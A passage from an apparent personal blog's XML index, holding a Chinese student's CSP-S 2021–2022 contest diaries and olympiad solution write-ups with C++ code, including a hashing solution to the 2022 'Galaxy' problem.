(f[i][j] != INT_MIN) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i + <span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> c = <span class="string">&#x27;a&#x27;</span>; c &lt;= <span class="string">&#x27;z&#x27;</span>; c++) &#123;</span><br><span class="line">                        f[i + <span class="number">1</span>][jump[j][c]] = std::<span class="built_in">max</span>(f[i + <span class="number">1</span>][jump[j][c]], f[i][j] + (jump[j][c] == m));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> f[i + <span class="number">1</span>][jump[j][s[i + <span class="number">1</span>]]] = std::<span class="built_in">max</span>(f[i + <span class="number">1</span>][jump[j][s[i + <span class="number">1</span>]]], f[i][j] + (jump[j][s[i + <span class="number">1</span>]] == m));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; *std::<span class="built_in">max_element</span>(f[n].<span class="built_in">begin</span>(), f[n].<span class="built_in">end</span>()) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>Codeforces</tag>
        <tag>字符串</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP-S 2021 第一轮 行记</title>
    <url>/csp2021-1/</url>
    <content><![CDATA[<p>总觉得应该写些什么……</p>
<h1 id="day-0">Day 0</h1>
<p>今天周六，中午日常去机房，该复习的都复习过了，已经无心复习初赛，只是看了一下图论。</p>
<p>考场设在石室文庙，又勾起了中考考砸的不美好的回忆 QWQ</p>
<p>早上老师正常讲了一下课，中午竞赛来时强调了一些重要事项，下午又上了一些课。</p>
<p>晚上回家已经很晚，最后上床前复习了一下图论和卡特兰数。</p>
<span id="more"></span>
<h1 id="day-1">Day 1</h1>
<p>上午进考场，准备考试（话说洛谷签到签出来大凶是什么意思喂？！）。</p>
<p>考试开始快速浏览了一下卷子，12 页（今年怎么还不用机读卡啊）。</p>
<p>选择题？简单，30 分钟写完。</p>
<p>阅读程序第一个懒得看，直接手动模拟。</p>
<p>？？？</p>
<p>这怎么考了立体几何了啊喂？</p>
<p>高一还没学啊！！！</p>
<p>阅读程序第二题稍微看了一下，两种方法二分求连续子序列的最大和，还算简单。</p>
<p>第三题？手算 base64，不想说了……</p>
<p>最后看了一下填程序，第一题看了一下看得懂，但又不完全懂……</p>
<p>第二题……</p>
<p>什么是卡特兰树？什么是 RMQ 算法？LCA 忘了……</p>
<p>算了算了直接蒙。</p>
<p>最后做完卷子还有 15 分钟，这张卷子实在不想检查了。</p>
<h1 id="day">Day ???</h1>
<p>分数线 50 分，52 分滚粗。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>CSP</tag>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP-S 2021 第二轮 行记</title>
    <url>/csp2021-2/</url>
    <content><![CDATA[<p><del>爆零了？</del></p>
<p>没爆零！</p>
<h1 id="day-0">Day 0</h1>
<p>简单的准备了一下，下午在机房摸了一小会儿鱼，看了一下考试技巧，在洛谷上写了一下单源最短路找一下手感，顺便再和
"Isoheptane" "huaruoji" 聊一下天。</p>
<h1 id="day-1">Day 1</h1>
<p><del>CCF 迷惑操作，把考点设置在了绵阳</del></p>
<p>开了一个上午的车，终于到了绵阳东辰国际学校。来到考场后，发现考场环境比想象中的要好，九代标压
i7 加上 8G 内存完全够用。</p>
<span id="more"></span>
<h2 id="t1">T1</h2>
<p>看了一眼题，感觉不难，就开始做了。</p>
<p>这道题先把飞进来的飞机按照飞机的起飞顺序排序，然后再模拟有无限个廊道，维护一个数组，其中存储了每个廊道可容下的最大飞机数和最晚飞机起飞的时间。分别模拟国内场和国际场的廊道情况。最后把
n 拆成两个数，求最大值即可。时间复杂度为 <span
class="math inline">\(O(n^2)\)</span>。考场上以为可以 AC。</p>
<p>最后和 "huaruoji" 交流了一下，发现 <span
class="math inline">\(O(n^2)\)</span> 会被卡，正解的复杂度是 <span
class="math inline">\(O(n \log n)\)</span>。</p>
<h2 id="t2">T2</h2>
<p><del>看到这道题我吐血了，小 c 会做的题我完全不会做。</del></p>
<p>以为这题可做，就花了一个半小时做了这一道题
<del>（然而并没有做出来）</del> 。</p>
<p>先是想的数学方法，如果 ? 可以被替换成 ) 或 *，那就
<code>ans = 2 * ans + 1</code>，然后搜索 ? 替换成 ( 的情况。</p>
<p>然后发现这个方法无法判重，就全部改成了深搜剪枝，但始终第二个样例要少两个数，心态很爆炸。</p>
<p><del>然而并没有关系，毕竟洛谷上此时全部 TLE 了。</del></p>
<h2 id="t3">T3</h2>
<p>最后做的，花了半个小时想思路。</p>
<p>先是将相同的数在上面连线，如 a b c d a 这个数列中 a 包围了 b c
d。若在包围的数中有几根线无论如何都会交叉就无解，否则就优先输出
L。可以先解决包围的数，如前面数列中的 a，最后解决被包围的数，直接输出 L
完事，最后回文简单处理即可。</p>
<p>虽然证明出来了算法的正确性，但是没时间写，于是又爆零了。</p>
<h2 id="t4">T4</h2>
<p>看不懂题，不会，输出 0，跳过。</p>
<h1 id="day-2">Day 2</h1>
<p>没停课，赶作业 ing。</p>
<h1 id="day-3">Day 3</h1>
<p>代码发出来了，测了一下。</p>
<p>T1 只有 5 分？？？</p>
<p>重新看了一下代码，</p>
<p>真！的！爆！零！了！</p>
<p>我是伞兵！</p>
<img src="/csp2021-2/sb.png" class="">
<p>回头全部测了一下数据，分数 5+0+0+0=5pts，炸了。</p>
<p><del>"huaruoji" 128pts 省一预定 %%%</del></p>
<p><del>"iqx37f" 360pts 省队预定 %%%</del></p>
<h1 id="day">Day ???</h1>
<p>分数出来了。</p>
<p>感谢 CCF 的数据，给了我第一题很多分！（不过如果没写错可以有 95
QWQ）</p>
<p>最终成绩：60 + 0 + 12 + 0 = 72，省二滚粗。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>CSP</tag>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP-S 2022 第一轮 行记</title>
    <url>/csp2022-1/</url>
    <content><![CDATA[<p><del>又来记流水账了 QWQ</del></p>
<h1 id="day-0">Day 0</h1>
<p>由于成都疫情一直在家，复习了一下初赛，然后继续刷题。由于现在基本等于停课状态准备算比较充分。</p>
<p>今年是线上考，事先试了一下设备。刷了一套初赛题之后就在洛谷上刷其它题去了（逃
<del>还是复赛题有意思</del></p>
<p>补了几集《四月是你的谎言》就睡觉了。</p>
<span id="more"></span>
<h1 id="day-1">Day 1</h1>
<p>毕竟是最后一场 CSP-S 了，还是有点紧张。</p>
<p>实在无心复习，上午就更新了一下
Blog，写了一下最近刷的部分题目的题解。</p>
<p>中午提前一个小时就进考场（实际上是腾讯会议），就在那里干瞪着瞪了一个小时。想着是最后一次参加
CSP-S 了依然挺紧张 QWQ</p>
<p>提前十分钟登了系统，没过多久就开考了。</p>
<p>前面的题都还算友好，但到了 T10 答案死活算出来都是 <span
class="math inline">\(\frac{ {8 \choose 2} {6 \choose 2} {4 \choose 2}
{2 \choose 2} }{4!} = 105\)</span> 卡了 10 多分钟，实在没法了就蒙了
C（考完后才发现 CCF 语文不过关），然后发现选择题做完已经过去 40min
了，有点慌。</p>
<p>然后做到读程序题，T1 看了一会儿带了样例算了算，发现是一个 <span
class="math inline">\(\text{next}\)</span> 数组写得不太好的像 KMP
的算法。时间复杂度最劣是 <span
class="math inline">\(\Theta(nm)\)</span>（CCF 不分 <span
class="math inline">\(O\)</span> 和 <span
class="math inline">\(\Theta\)</span> 扣钱！），模拟几下就过掉了。</p>
<p>阅读程序 T2
没看懂，然后看了一下第一问才知道这是个排序。回头仔细研究了一下发现是
<span class="math inline">\(k\)</span>
个关键字的基数排序，题目答案就水落石出了。</p>
<p>阅读程序 T3 一看就知道是进制转化，做了一半发现 <span
class="math inline">\(n\)</span>
可能是负数。自造了一些样例带进去算了一下发现是求 <span
class="math inline">\(n\)</span> 的 <span
class="math inline">\(k\)</span>
进制补码。后面的事情就自然而然的解决了。然后看了一下时间还有不到半个小时。。。</p>
<p>然后做了完善程序。第一题感觉是二分后处理尾部，没怎么看懂。就先做第二题，发现第二题考的是用记忆化搜索写的
DP，且考得非常简单，就把第二题秒了。回头再看第一题，看了一会儿把确定的写了，最后两个空不确定的大致二选一猜了一下。写完整张卷子的时候距离考试结束只剩
10min。。。</p>
<p>最后检查了一遍答题卡和答案，检查的时候突然知道了阅读程序第一题最后两个空怎么做，飞速改完。在最后
1min 提交这两个空的修改后又检查了一遍该题，真 TM 刺激。</p>
<p>接着考完试之后在 JKFOI 聊了一会儿天，刷了一下洛谷
<del>然后发现这套题骂声连篇</del>，以及发现字自己 T10 被坑了。</p>
<p>最后还是估了一下分，洛谷数据 81.5pts，有道小图灵数据
89pts，稳过。</p>
<p>最后在 JKFOI 打了一局雀魂，上传了考试录像，这一天就结束了。</p>
<h1 id="day">Day ???</h1>
<p>出成绩。上午 10:00 的时候就开始查成绩，一直查到了晚上
7:30，期间网站一直 502 或 504 <del>感谢 CCF 的优秀服务器，让所有 SC OIer
都可以享受 502pts 和 504pts 的全国首位的超高分。SC 或许成为首个人均 AK
初赛的省份（大雾</del></p>
<p>最后终于查到了。87.5pts，稳过。</p>
<img src="/csp2022-1/score.png" class="">
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>2022</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP-S 2022 第二轮 行记</title>
    <url>/csp2022-2/</url>
    <content><![CDATA[<p>寄</p>
<h1 id="省流"><del>省流</del></h1>
<blockquote>
<p>代码</p>
</blockquote>
<img src="/csp2022-2/sb.png" class="">
<blockquote>
<p>题面</p>
</blockquote>
<img src="/csp2022-2/statement.png" class="">
<h1 id="day--3">Day -3</h1>
<p>考点出来了，在七高考试 <del>总算在成都了</del>。</p>
<p>下午练手写了一道 <a
href="https://www.luogu.com.cn/problem/P7506">大模拟</a> <del>然后被 C++
的除法向 0 取整坑了几个小时 QWQ</del></p>
<p>打算明天复习一下模板，避免考试写挂。</p>
<span id="more"></span>
<h1 id="day--2--1-0">Day -2 &amp; -1 &amp; 0</h1>
<p>复习了一下板子，简单刷了几道水题，也把之前的真题看了一下。顺带二刷了《命运石之门0》<del>真的好看</del>。</p>
<h1 id="day-1">Day 1</h1>
<p>早上起床后最后复习了一下板子，不想复习也不想颓废。下午就去考试了。</p>
<p>这次考试全员七高，开车几分钟就到了。然而当时进学校时离考试开始只有
20min 了，就直接进了考场。</p>
<p>进了考场，座位坐在最边上，旁边是 huaruoji。看了一下电脑配置 CPU 是 10
代 i7，配置挺高的。</p>
<p>考试开始前试题发下来了，密码是
<code>belief2022</code>，但愿自己可以和密码想的一样吧。</p>
<hr />
<p>看了一下题，四道题中三道图论，T2 还出现了 CSP/NOIP 万年不出现的博弈题
<del>CCF 没活了可以咬打火机</del>。感觉这次考试不简单。</p>
<p>考试开始后准备做 T1，首先想到的是把图连边，然后跑一遍限制层数的 DFS
即可。连边直接算出两点间距离即可。但这样做需要用
Folyd，预处理的时间复杂度已经达到了 <span
class="math inline">\(O(n^3)\)</span>（考场上脑抽了没想到不带边权的图可直接跑
<span class="math inline">\(n\)</span> 次 BFS 的复杂度可达 <span
class="math inline">\(O(n^2)\)</span>
QAQ），于是这种做法就毙掉了。看数据范围发现 <span
class="math inline">\(k\)</span> 较小，考虑先枚举可行的 <span
class="math inline">\(A\)</span>、<span class="math inline">\(D\)</span>
点，这样一遍 DFS 即可。然后通过两两枚举可行的 <span
class="math inline">\(A\)</span>、<span class="math inline">\(D\)</span>
点再计算出 <span class="math inline">\(B\)</span>、<span
class="math inline">\(C\)</span>
两点。然而这种做法随便出个菊花图就被卡掉了。又想了各种做法，但都发现不够优。此时已经过了
1.5h，代码还一笔没动，有点慌就去开 T2 了。</p>
<p>接下来看了一下 T2，反而发现此题极水。只需要开线段树或 ST 表维护 <span
class="math inline">\(a\)</span>
的最大值、最小值、负数最大值、正数最小值、<span
class="math inline">\(0\)</span> 的个数和 <span
class="math inline">\(b\)</span>
的最大值、最小值即可。然后询问的时候先查询 <span
class="math inline">\(b\)</span> 的最大值 <span
class="math inline">\(\text{maxB}\)</span> 和最小值 <span
class="math inline">\(\text{minB}\)</span>，两者同号则在 <span
class="math inline">\(a\)</span>
中尽量取异号绝对值最大，没有异号则取同号绝对值最小。若 <span
class="math inline">\(\text{maxB}\)</span> 和 <span
class="math inline">\(\text{minB}\)</span> 两者异号则取 <span
class="math inline">\(a\)</span> 中绝对值最小即可。于是考场上直接开了
<span class="math inline">\(6\)</span> 颗线段树用了 40min
把这道题大样例过了。预估 100 pts。</p>
<p>然后看 T3，花了 10min
理解了一下题意。简单分析了一下发现只要每个点的出度为 <span
class="math inline">\(1\)</span>
就可进行反攻。于是开了邻接矩阵，直接存边和边是否可用。然后暴力加边删边，写了个
<span class="math inline">\(O(n^2)\)</span> 的程序。预估
40pts。此时距离考试结束还有 1.5h。接下来就开始了这场考试的崩坏。。。</p>
<p>看了一下 T4，感觉不太可做就去看 T1 了，没看部分分就没想到 <span
class="math inline">\(k = 1\)</span> 时直接写个 LCA 就行了
QAQ。然后想了一会儿 T1 仍然想不出正解就打暴力。然而开始写 T1
的时候没看到输入“第二行包含 <span class="math inline">\(n - 1\)</span>
个正整数”于是考试时写的是输入 <span class="math inline">\(n\)</span>
个数，考试时又一直用文件输入输出，于是暴力就写挂了 <del>70pts 没了
QAQ</del>。</p>
<h1 id="day-2">Day 2</h1>
<p>心态挺爆炸的，测了一下民间数据 0 + 100 + 40 + 0 =
140pts，身边的人都是 200+ 和 300+，铁省二了，按照自己的能力至少可以拿到
70 + 100 + 40 + 16 = 226pts 的 /kk</p>
<p>看来读题和写暴力的能力还是要好好注意一下，写完程序后和题面逐字对照一下可能会好一点。</p>
<p>最后看了一下，T3 考的是万年不考的哈希，T4
DDP，在联赛中全是不常见的知识点，得好好拓展一下知识面了。</p>
<h1 id="day">Day ???</h1>
<p>0 + 95 + 40 + 0 = 135pts，今年这 CCF 出的数据不是一般的烂，T3 全输出
NO 有 45pts <del>然而我并没有这样干</del>。。。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>2022</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title>「CSP-S 2022」星战 - 图论 + Hash</title>
    <url>/csp2022-galaxy/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8819">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3891">LibreOJ 链接</a></p>
<p>在这一轮的星际战争中，我方在宇宙中建立了 <span
class="math inline">\(n\)</span> 个据点，以 <span
class="math inline">\(m\)</span> 个单向虫洞连接。我们把终点为据点 <span
class="math inline">\(u\)</span> 的所有虫洞归为据点 <span
class="math inline">\(u\)</span> 的虫洞。</p>
<p>战火纷飞之中这些虫洞很难长久存在，敌人的打击随时可能到来。这些打击中的有效打击可以分为两类：</p>
<ol type="1">
<li>敌人会摧毁某个虫洞，这会使它连接的两个据点无法再通过这个虫洞直接到达，但这样的打击无法摧毁它连接的两个据点。</li>
<li>敌人会摧毁某个据点，由于虫洞的主要技术集中在出口处，这会导致该据点的所有还未被摧毁的虫洞被一同摧毁。而从这个据点出发的虫洞则<strong>不会摧毁</strong>。</li>
</ol>
<p>注意：摧毁只会导致虫洞不可用，而不会消除它的存在。</p>
<p>为了抗击敌人并维护各部队和各据点之间的联系，我方发展出了两种特种部队负责修复虫洞：</p>
<ul>
<li>A 型特种部队则可以将某个特定的虫洞修复。</li>
<li>B 型特种部队可以将某据点的所有损坏的虫洞修复。</li>
</ul>
<p>考虑到敌人打击的特点，我方并未在据点上储备过多的战略物资。因此只要这个据点的某一条虫洞被修复，处于可用状态，那么这个据点也是可用的。</p>
<p>我方掌握了一种苛刻的空间特性，利用这一特性我方战舰可以沿着虫洞瞬移到敌方阵营，实现精确打击。</p>
<p>为了把握发动反攻的最佳时机，指挥部必须关注战场上的所有变化，为了寻找一个能够进行反攻的时刻。总指挥认为：</p>
<ul>
<li>如果从我方的任何据点出发，在选择了合适的路线的前提下，可以进行无限次的虫洞穿梭（可以多次经过同一据点或同一虫洞），那么这个据点就可以<strong>实现反击</strong>。</li>
<li>为了使虫洞穿梭的过程连续，尽量减少战舰在据点切换虫洞时的质能损耗，当且仅当<strong>只有一个从该据点出发的虫洞可用</strong>时，这个据点可以<strong>实现连续穿梭</strong>。</li>
<li>如果我方所有据点都可以<strong>实现反击</strong>，也都可以<strong>实现连续穿梭</strong>，那么这个时刻就是一个绝佳的<strong>反攻</strong>时刻。</li>
</ul>
<p>总司令为你下达命令，要求你根据战场上实时反馈的信息，迅速告诉他当前的时刻是否能够进行一次<strong>反攻</strong>。</p>
<p>对于所有数据保证：<span class="math inline">\(1 \le n \le 5 \times
{10}^5\)</span>，<span class="math inline">\(1 \le m \le 5 \times
{10}^5\)</span>，<span class="math inline">\(1 \le q \le 5 \times
{10}^5\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题实质是有一张有向图，有若干次加边删边操作，问每次操作完后从每个点出发均可进入一个强连通分量，且每个点的出度为
<span class="math inline">\(1\)</span>。</p>
<p>由图论知识可推出，只要每个点的出度为 <span
class="math inline">\(1\)</span>，则从任意点出发必定可进入一个强连通分量。因为只要有
<span class="math inline">\(2\)</span>
点则必有环，只要出现另外的点，由于出度为 <span
class="math inline">\(1\)</span>
则必定连向环或连向连向环的点。于是只要判断出每个点的出度为 <span
class="math inline">\(1\)</span> 则说明该图满足条件。</p>
<p>由于数据范围过大，我们肯定需要在小于 <span
class="math inline">\(O(n)\)</span>
的情况下判断这张图是否满足情况。这时我们可以用 Hash
解决。设每个点对应一个 Hash 值 <span
class="math inline">\(a_i\)</span>（<span
class="math inline">\(a_i\)</span>
可使用随机数生成，且需要是大数以减少冲突概率）和出度 <span
class="math inline">\(d_i\)</span>，我们可以定义这张图的 Hash 值 <span
class="math inline">\(\text{res}\)</span> 为 <span
class="math inline">\(\sum_{i = 1}^n{a_i d_i}\)</span>。只要满足 <span
class="math inline">\(\text{res} = \sum_{i = 1}^n{a_i}\)</span>
即可说明这张图满足条件。对于加边 <span class="math inline">\(u
\rightarrow v\)</span> 操作，我们只需更新 <span
class="math inline">\(\text{res} = \text{res} + a_u\)</span>
即可；同理对于删边 <span class="math inline">\(u \rightarrow v\)</span>
操作，我们只需更新 <span class="math inline">\(\text{res} = \text{res} -
a_u\)</span> 即可。这样就可实现 <span
class="math inline">\(O(1)\)</span> 处理，<span
class="math inline">\(O(1)\)</span> 查询。</p>
<p>同时我们也需要实现对于据点的加边和删边操作。我们可以对每个点再开一个
Hash 值 <span class="math inline">\(\text{in}_i\)</span>，表示删除 <span
class="math inline">\(i\)</span> 号点对 <span
class="math inline">\(\text{res}\)</span>
的变化值。每次进行加边和删边操作时，同时在 <span
class="math inline">\(\text{in}_i\)</span> 中操作。即进行加边 <span
class="math inline">\(u \rightarrow v\)</span> 时，更新 <span
class="math inline">\(\text{in}_v = \text{in}_v + a_u\)</span>，进行删边
<span class="math inline">\(u \rightarrow v\)</span> 时，更新 <span
class="math inline">\(\text{in}_v = \text{in}_v -
a_u\)</span>。这样即可在删除 <span class="math inline">\(v\)</span>
点时，直接更新 <span class="math inline">\(\text{res} = \text{res} -
\text{in}_u\)</span> 并将 <span
class="math inline">\(\text{in}_u\)</span>
清空即可。对于加点操作，我们可以直接在询问前处理出 <span
class="math inline">\(\text{init}_i\)</span> 表示 <span
class="math inline">\(\text{in}_i\)</span>
的最初状态，然后加点时直接恢复至最初状态，即更新 <span
class="math inline">\(\text{res} = \text{res} + \text{init}_i -
\text{in}_i\)</span>，<span class="math inline">\(\text{in}_i =
\text{init}_i\)</span> 即可。时间复杂度为 <span
class="math inline">\(O(n)\)</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt; <span class="title">a</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::mt19937 <span class="title">rng</span><span class="params">(std::random_device&#123;&#125;())</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        a[i] = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="built_in">rng</span>() &lt;&lt; <span class="number">31</span>) ^ <span class="built_in">rng</span>();</span><br><span class="line">        target += a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt; <span class="title">init</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        init[v] += a[u];</span><br><span class="line">        res += a[u];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt; <span class="title">in</span><span class="params">(init)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q);</span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> op;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;op);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u, v;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">            in[v] -= a[u];</span><br><span class="line">            res -= a[u];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;u);</span><br><span class="line">            res -= in[u];</span><br><span class="line">            in[u] = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u, v;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">            in[v] += a[u];</span><br><span class="line">            res += a[u];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;u);</span><br><span class="line">            res += init[u] - in[u];</span><br><span class="line">            in[u] = init[u];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res == target) <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>CSP</tag>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title>「CSP-S 2022」假期计划 - 最短路 + BFS + 贪心</title>
    <url>/csp2022-holiday/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8817">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3889">LibreOJ 链接</a></p>
<p>小熊的地图上有 <span class="math inline">\(n\)</span>
个点，其中编号为 <span class="math inline">\(1\)</span>
的是它的家、编号为 <span class="math inline">\(2, 3, \ldots, n\)</span>
的都是景点。部分点对之间有双向直达的公交线路。如果点 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(z_1\)</span>、<span
class="math inline">\(z_1\)</span> 与 <span
class="math inline">\(z_2\)</span>、……、<span class="math inline">\(z_{k
- 1}\)</span> 与 <span class="math inline">\(z_k\)</span>、<span
class="math inline">\(z_k\)</span> 与 <span
class="math inline">\(y\)</span> 之间均有直达的线路，那么我们称 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 之间的行程可转车 <span
class="math inline">\(k\)</span> 次通达；特别地，如果点 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 之间有直达的线路，则称可转车 <span
class="math inline">\(0\)</span> 次通达。</p>
<p>很快就要放假了，小熊计划从家出发去 <span
class="math inline">\(4\)</span> 个<strong>不同</strong>的景点游玩，完成
<span class="math inline">\(5\)</span> 段行程后回家：家 <span
class="math inline">\(\to\)</span> 景点 A <span
class="math inline">\(\to\)</span> 景点 B <span
class="math inline">\(\to\)</span> 景点 C <span
class="math inline">\(\to\)</span> 景点 D <span
class="math inline">\(\to\)</span> 家且每段行程最多转车 <span
class="math inline">\(k\)</span>
次。转车时经过的点没有任何限制，既可以是家、也可以是景点，还可以重复经过相同的点。例如，在景点
A <span class="math inline">\(\to\)</span> 景点 B
的这段行程中，转车时经过的点可以是家、也可以是景点 C，还可以是景点 D
<span class="math inline">\(\to\)</span> 家这段行程转车时经过的点。</p>
<p>假设每个景点都有一个分数，请帮小熊规划一个行程，使得小熊访问的四个<strong>不同</strong>景点的分数之和最大。</p>
<p>对于所有数据，保证 <span class="math inline">\(5 \le n \le
2500\)</span>，<span class="math inline">\(1 \le m \le
10000\)</span>，<span class="math inline">\(0 \le k \le
100\)</span>，所有景点的分数 <span class="math inline">\(1 \le s_i \le
{10}^{18}\)</span>。保证至少存在一组符合要求的行程。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>首先我们可以先在预处理，每个点跑一遍 BFS 求出从 <span
class="math inline">\(u\)</span> 到 <span
class="math inline">\(v\)</span> 的最小步数 <span
class="math inline">\(\text{step}_{u, v}\)</span>。</p>
<p>对于一种部分分写法，我们可以把 <span
class="math inline">\(\text{step}_{u, v} \le k + 1\)</span>
的边连起来，然后跑一遍深度为 <span class="math inline">\(4\)</span> 的
DFS。但这样如果数据构造出菊花图或点数多后很容易爆炸，实际得分
70pts。</p>
<p>接下来我们可以想优化，由于只需经过 <span
class="math inline">\(4\)</span>
个点，我们可以考虑枚举经过的点。根据数据范围和题目信息，很容易推出我们需要枚举
<span class="math inline">\(2\)</span>
个点，然后计算出最优的另外两个点即可。为了让可选点的限制尽量多，我们可选择枚举
<span class="math inline">\(B\)</span> 和 <span
class="math inline">\(C\)</span> 两点。这样我们只需要算出 <span
class="math inline">\(B/C \rightarrow 1\)</span>
所经过的唯一最优点即可。</p>
<p>在枚举的时候寻找可行的点显然不可行，于是我们可以想到对每个点 <span
class="math inline">\(u\)</span>，预处理满足 <span
class="math inline">\(\text{step}_{1, v} \le k + 1 \wedge
\text{step}_{v, i} \le k + 1\)</span> 的所有 <span
class="math inline">\(v\)</span> 点。将所有 <span
class="math inline">\(v\)</span> 点存入 <span
class="math inline">\(\text{att}_u\)</span>
数组，然后根据每个点的分数从大到小将 <span
class="math inline">\(\text{att}_u\)</span> 排序。时间复杂度 <span
class="math inline">\(O(n^2)\)</span>。</p>
<p>最后我们枚举 <span class="math inline">\(B\)</span>、<span
class="math inline">\(C\)</span> 两点，然后分别从 <span
class="math inline">\(\text{att}_B\)</span> 和 <span
class="math inline">\(\text{att}_C\)</span> 中选择不重复的 <span
class="math inline">\(A\)</span>、<span class="math inline">\(D\)</span>
点即可。使用贪心可以证明最优的 <span
